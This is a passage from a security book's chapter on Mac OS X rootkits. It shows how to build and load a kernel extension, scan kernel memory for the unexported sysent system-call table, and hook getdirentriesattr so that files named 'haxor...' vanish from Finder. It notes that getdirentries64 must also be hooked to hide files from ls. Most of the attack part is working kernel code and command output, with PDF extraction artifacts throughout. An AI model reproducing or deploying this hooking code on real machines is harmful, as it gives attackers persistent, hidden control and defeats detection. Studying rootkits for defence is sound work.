are called when the extension is loaded and unloaded, respectively. The source
code should look something like the following.
#include 
kern_return_t hello_kernel_start (kmod_info_t * ki, void * d) {
printf(“In start\n”);
return KERN_SUCCESS;
}
kern_return_t hello_kernel_stop (kmod_info_t * ki, void * d) {
printf(“In stop\n”);
return KERN_SUCCESS;
}
Open the Info.plist file and add the value 8.0.0 to the entries com.apple.
kpi.bsd and com.apple.kpi.libkern under the OSBundleLibraries entry; see
Figure 12-2.
Figure 12-2: The Info.plist file for the hello_kernel extension
Finally, press the Build button in the GUI to build the kext. Xcode creates the
kext in the build/Debug directory. Examining this directory shows that kexts
are actually a type of bundle.
$ find .
./hello-kernel.kext
./hello-kernel.kext/Contents
./hello-kernel.kext/Contents/Info.plist
./hello-kernel.kext/Contents/MacOS
./hello-kernel.kext/Contents/MacOS/hello-kernel
./hello-kernel.kext/Contents/Resources
./hello-kernel.kext/Contents/Resources/English.lproj
./hello-kernel.kext/Contents/Resources/English
9955336633cc1122..iinndddd 332299 11//2255//0099 44::4433::2200 PPMM
330 Part IV ■ Post-Exploitation
This bundle contains an information property-list fi le, which we’ll examine
shortly, and a kernel module, or kmod. The kmod is a statically linked, relocat-
able Mach-O binary. The kext may now be loaded into the kernel. One caveat
is that the entire bundle must be owned by root with group wheel.
$ cp -pr hello-kernel.kext /tmp
$ sudo chown -R root:wheel /tmp/hello-kernel.kext
$ sudo kextload /tmp/hello-kernel.kext
kextload: /tmp/hello-kernel.kext loaded successfully
To see that the kext is actively loaded, you can issue the kextstat command:
$ kextstat
…
123 0 0x2e263000 0x2000 0x1000
com.yourcompany.kext.hello_kernel (1.0.0d1) 
Unloading it is just as easy:
$ sudo kextunload /tmp/hello-kernel.kext
kextunload: unload kext /tmp/hello-kernel.kext succeeded
The print statements appear in the system log:
$ grep ‘kernel\[0\]’ /var/log/system.log
Sep 11 14:41:15 Charlie-Millers-Computer kernel[0]: In start
Sep 11 14:41:20 Charlie-Millers-Computer kernel[0]: In stop
System Calls
System calls are the glue between user-space processes and the kernel. They act
as a way for user processes to request information and services from the kernel.
As demonstrated in the chapter on shellcode, at the assembly level a system call
will usually look something like this:
mov eax, 1 ; SYS_exit
int 0x80
The number placed into the EAX register (for x86 architectures) indicates
which system call should be invoked when the interrupt 80 is executed. These
numbers can be found in /usr/include/sys/syscall.h.
In the kernel a large table called sysent is indexed by the value placed in EAX
before the system call. (The name comes from the fact that besides int 80, the
9955336633cc1122..iinndddd 333300 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 331
more traditional way to perform a system call is with the sysenter instruction.)
At each spot in the sysent table lies the following structure.
struct sysent { /* system call table */
int16_t sy_narg; /* number of args */
int8_t sy_resv; /* reserved */
int8_t sy_flags; /* flags */
sy_call_t *sy_call; /* implementing function */
sy_munge_t *sy_arg_munge32; /* system call arguments
munger for 32-bit process */
sy_munge_t *sy_arg_munge64; /* system call arguments
munger for 64-bit process */
int32_t sy_return_type; /* system call return types */
uint16_t sy_arg_bytes; /* Total size of arguments in
bytes for
* 32-bit system calls
*/
};
Of these fi elds, the most interesting from a rootkit perspective is sy_call,
which is a function pointer to the actual code needed for the system call.
One possible way for a kernel-level rootkit to work is by changing the values
of one or more of these function pointers for various system calls. This tech-
nique is generally known as hooking. The basic idea is evident in the following
pseudocode.
old_systemcall = sysent[systemcallnumber].sy_call;
sysent[systemcallnumber] = new_systemcall.sy_call;
new_systemcall(args){
// do something before real systemcall
old_systemcall(args)
// do something after real systemcall.
}
The idea is you simply save off the address of the original system-call code
and replace the function pointer in the sysent table to point to your new version
of the system call, which can still call the original system-call code. This is the
way many basic rootkits work.
One minor issue on Mac OS X is that in recent versions, the kernel does not
export the location of the sysent table. Therefore, your kernel module cannot
make reference to it directly. This isn’t a deal breaker. It is still possible to fi nd
this table in kernel memory and reference it to hook the system calls.
For any recent Mac OS X kernel, the nsysent variable (used to store the num-
ber of entries in the sysent table) is located just a bit before the sysent table.
9955336633cc1122..iinndddd 333311 11//2255//0099 44::4433::2211 PPMM
332 Part IV ■ Post-Exploitation
Unlike sysent, nsysent is exported. Starting at this address, you can search for
something that has the same structure as the sysent table.
#define is_small(x) (*(x)>=0 && *(x)10000)
#define is_optional_addy(x) (*(x)==0 || *(x)>10000)
#define is_stuct_sysent(x) ( is_small(x) && is_addy((x)+1) &&
is_optional_addy((x)+2) && is_optional_addy((x)+3) && is_small((x)+4) &&
is_small((x)+5) )
#define is_sysent(x) (is_stuct_sysent((x)) &&
is_stuct_sysent((x+6)) && is_stuct_sysent((x+12)))
static struct sysent *find_sysent () {
unsigned int *looker = (unsigned int *) ( ((char *) &nsysent) +
sizeof(nsysent) );
while(!is_sysent(looker)){
looker++;
}
printf(“Found sysent table at %x\n”, looker);
return (struct sysent *) looker;
}
This code starts directly after the nsysent value and looks for three consecu-
tive structures that look like a struct sysent. Namely, by looking at the struct
sysent, you can see that three types of values show up. There are small things,
like the number of arguments or the return type. There are things that should
be pointers, like sy_call. Finally, there are things that may be pointers or may
be null, like sy_arg_munge32. By looking for things of the particular expected
type in the particular expected order, you can be pretty sure you have found
the address of the sysent table. For more reassurance, you could look for 5, 10,
or even nsysent such consecutive structures. You could also look for specifi c
values for the fi rst few system calls, although the simple method described
earlier works fi ne. Now that you have the location of this data structure in
memory, you may begin hooking the system calls to accomplish your goals of
remaining stealthy on the system.
Hiding Files
Let’s create a simple rootkit that will hide fi les that begin with a certain prefi x.
In practice this would be useful to hide the rootkit fi le on disk, any temporary
fi les used to store keystrokes, any software installed by the attacker, etc. You
fi rst need to fi gure out what system calls the program(s) you are trying to hide
from use and change their behavior not to report on these particular hidden
9955336633cc1122..iinndddd 333322 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 333
fi les. To begin, focus on the Mac OS X Finder. To determine what system calls
Finder uses when looking through directories, create a simple DTrace script
that will print out the system calls used.
syscall:::entry
/execname == “Finder”/
{
}
Run this script and navigate the fi le system with Finder. Filtering out some
system calls that don’t seem relevant reveals the following.
$ sudo dtrace -s finder-finder.d | grep -v map | grep -v kevent | grep
-v geteuid | grep -v uid
dtrace: script ‘finder-finder.d’ matched 427 probes
CPU ID FUNCTION:NAME
0 18160 access_extended:entry
0 18032 getattrlist:entry
0 17602 open:entry
0 18036 getdirentriesattr:entry
0 17602 open:entry
0 17602 open:entry
0 17602 open:entry
0 17602 open:entry
0 18036 getdirentriesattr:entry
0 17602 open:entry
0 17602 open:entry
0 17602 open:entry
…
Checking out the man page for getdirentriesattr reveals that “The get-
direntriesattr() function reads directory entries and returns their attributes
(that is, metadata).” This is the system call that Finder is using to obtain a list
of fi les in a directory. This system call has the following prototype.
int getdirentriesattr(int fd, struct attrlist *attrList, void *attrBuf,
size_t attrBufSize, unsigned long *count, unsigned long *basep, unsigned
long *newState, unsigned long options);
It is not important to understand exactly how it works, but just know that for
a given open fi le descriptor, this system call will return a series of FInfoAttrBuf
structures (see below) in the buffer pointed to by attrBuf. This buffer has length
attrBufSize and contains *count structures. To hide a fi le, you have to call the real
getdirentriesattr function and then change the buffer pointed to by attrList to
remove the structure(s) that describes the hidden fi le(s) and fi x up attrBufSize
and count. Finally, return these modifi ed values to the user-space process.
9955336633cc1122..iinndddd 333333 11//2255//0099 44::4433::2211 PPMM
334 Part IV ■ Post-Exploitation
There is one fi nal thing to discuss before writing your fi le-hiding rootkit.
While the system-call prototype was given earlier, this is not the prototype for
the function the sysent table points to. Rather, the function looks like this:
int getdirentriesattr (proc_t p, struct getdirentriesattr_args *uap,
register_t *retval)
This came from vfs_syscalls.c from the XNU kernel source. Something similar
can be found in the sysproto.h fi le from the kernel development headers. These
include fi les can be found at /System/Library/Frameworks/Kernel.framework/
Versions/A/Headers. All the system calls take this form, with exactly three
arguments. The fi rst argument indicates information about the process that
called it. The second argument contains the actual arguments the system call
needs. The fi nal argument points to the return value of the system call. In this
case, the second argument takes the following form, again from sysproto.h,
struct getdirentriesattr_args {
char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
char alist_l_[PADL_(user_addr_t)]; user_addr_t alist; char
alist_r_[PADR_(user_addr_t)];
char buffer_l_[PADL_(user_addr_t)]; user_addr_t buffer; char
buffer_r_[PADR_(user_addr_t)];
char buffersize_l_[PADL_(user_size_t)]; user_size_t buffersize;
char buffersize_r_[PADR_(user_size_t)];
char count_l_[PADL_(user_addr_t)]; user_addr_t count; char
count_r_[PADR_(user_addr_t)];
char basep_l_[PADL_(user_addr_t)]; user_addr_t basep; char
basep_r_[PADR_(user_addr_t)];
char newstate_l_[PADL_(user_addr_t)]; user_addr_t newstate; char
newstate_r_[PADR_(user_addr_t)];
char options_l_[PADL_(user_ulong_t)]; user_ulong_t options; char
options_r_[PADR_(user_ulong_t)];
};
This is a complicated defi nition, but the PAD* macros have to do with the
endianness (byte ordering) of the hardware and can be ignored for this discus-
sion. Basically, in the kernel code from the rootkit, to access the buffer argument
passed by the user process into the system call, the rootkit will use uap->buffer.
The user_addr_t indicates that the address points to memory in the user-space
process (as opposed to kernel-space memory). This is important because kernel-
level code should not operate directly on user memory, as there is no guarantee
it is mapped at any given moment. Instead the copyin and copyout functions
should be called to copy data across the kernel/user-space barrier. Finally, you
are ready for a rootkit that hides fi les from Finder. The following function hooks
the system call.
static int our_getdirentriesattr(struct proc *p, struct
getdirentriesattr_args *uap, int *i){
9955336633cc1122..iinndddd 333344 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 335
int index;
int ret = real_getdirentriesattr(p, uap, i);
int count;
copyin(uap->count, &count, 4);
char *buffer, *end;
MALLOC(buffer, char *, uap->buffersize, M_TEMP, M_WAITOK);
copyin(uap->buffer, buffer, uap->buffersize);
end = buffer + uap->buffersize;
FInfoAttrBuf *thisEntry = (FInfoAttrBuf *) buffer;
int num_found = 0;
int num_removed = 0;
for (index = 0; index name) + thisEntry->
name.attr_dataoffset;
printf(“[getdirentriesattr] %s\n”, filename);
if(!memcmp(filename, “haxor”, 5)){
int removed_this_time = thisEntry->length;
char *thisone = (char *) thisEntry;
char *nextone = thisone + thisEntry->length;
int size_left = uap->buffersize - (thisone - buffer);
memmove(thisone, nextone, size_left);
num_found++;
num_removed+=removed_this_time;
} else {
char *t = ((char *) thisEntry) + thisEntry->length;
thisEntry = (FInfoAttrBuf *) t;
}
}
if(num_found > 0){
count -= num_found;
copyout(&count, uap->count, 4);
uap->buffersize -= num_removed;
copyout(buffer, uap->buffer, uap->buffersize);
}
FREE(buffer, M_TEMP);
return ret;
}
First this function calls the real getdirentriesattr function. Using the copyin
function, it copies the value of the count variable that indicates how many
structures are in the buffer. Next it allocates enough space to make a copy of
the user-space buffer to work on. It then copies the buffer containing all the
fi le-system information into the newly allocated kernel buffer. Then it iterates
through this buffer, comparing each fi lename to the string “haxor.” If it fi nds a
fi le that begins with these fi ve letters, it removes it from the buffer by fi nding the
9955336633cc1122..iinndddd 333355 11//2255//0099 44::4433::2211 PPMM
336 Part IV ■ Post-Exploitation
location of the next structure and calling memmove to move the rest of the buf-
fer on top of the current structure. It saves the number of bytes it has removed
in this fashion. If the fi le being examined did not begin with the magic string,
the function advances to the next structure and continues looking.
Finally, after examining the entire buffer, the function copies the modifi ed
buffer back into the user space in place of the real buffer by using copyout. It also
fi xes the count and buffersize variables and frees the buffer that was malloc’ed
earlier in the function and returns the original return value. The entire code
for this rootkit will be given later in this section.
Loading this kernel module and using Finder reveals that from Finder’s per-
spective, all the fi les that begin with “haxor” have disappeared; see Figures
12-3 and 12-4.
Figure 12-3: Now you see it.
Figure 12-4: Now you don’t.
Interestingly, with this rootkit installed, doing an ls on the directory in
question still reveals the hidden fi les! This is because ls doesn’t use the get-
direntriesattr system call to get directory listings, but instead uses some other
system call. Take this as a cautionary tale. There is usually more than one way
to do the same thing, and if you are hooking system calls, it is important to
hook all the system calls that could detect you. Using a similar DTrace script
reveals that ls uses getdirentries64, which is a slightly simpler version of the
getdirentriesattr system call. Hooking this system call as well results in the full
9955336633cc1122..iinndddd 333366 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 337
source of the fi le-hiding kernel extension. The fi rst portion of the code includes
the necessary fi les as well as defi nes the structures that cannot be included.
#include 
#include 
#include 